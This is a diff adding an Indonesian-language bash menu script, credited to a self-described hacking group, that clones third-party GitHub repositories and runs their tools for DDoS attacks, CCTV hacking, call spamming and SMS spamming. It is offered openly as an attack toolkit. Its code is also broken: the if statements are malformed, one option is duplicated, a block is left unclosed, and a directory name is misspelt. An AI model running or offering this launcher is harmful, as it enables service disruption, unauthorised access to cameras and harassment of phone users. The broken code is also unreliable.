@@ -1,0 +1,46 @@
+echo" 》》》》》》》》》》》》》》》"
+echo" 》Author>>Tn-RxHack《"
+echo" 》No Whatsapp>>082131296302《"
+echo" 》Muslim Cyber Anonymous《"
+echo" 《《《《《《《《《《《《《《《"
+echo" Hay kawan pergunakan Tools Ini dengan baik ya "
+echo" Selamat Mencoba:)"
+echo
+echo" [+] Menu Tools"
+echo" [1] DDOS ATTACK!!!"
+echo" [2] Hack Cctv:)"
+echo" [3] Spam Call!!"
+echo" [4] Spam Sms!!"
+read -p "pilih: " pil
+#batas
+if [ $pil = 1 ] [] [ $pil = 1 ]
+git clone https://github.com/Tn-RxHack/LITEDDOS
+cd LITEDDOS
+python2 LITEDDOS.py
+fi
+#batas
+if [ $pil = 2 ] [] [ $pil = 2 ]
+git clone https://github.com/Tn-RxHack/ipcs
+cd ipcs
+python2 scan.py
+fi
+#batas
+if [ $pil = 2 ] [] [ $pil = 2 ]
+git clone https://github.com/kancoqdit/ipcs
+cd ipcs
+python2 scan.py
+fi
+#batas
+if [ $pil = 3 ] [] [ $pil = 3 ]
+git clone https://github.com/B4N954N2-ID/SpamTelp
+cd SpamTelp
+python2 SpamTelp
+fi
+#batas
+if [ $pil = 4 ] [] [ $pil = 4 ]
+git clone https://github.com/Bladeknife/2otp
+cd 20tp
+python spam.py
+
+
+echo "Selamat Mencoba Kawan"
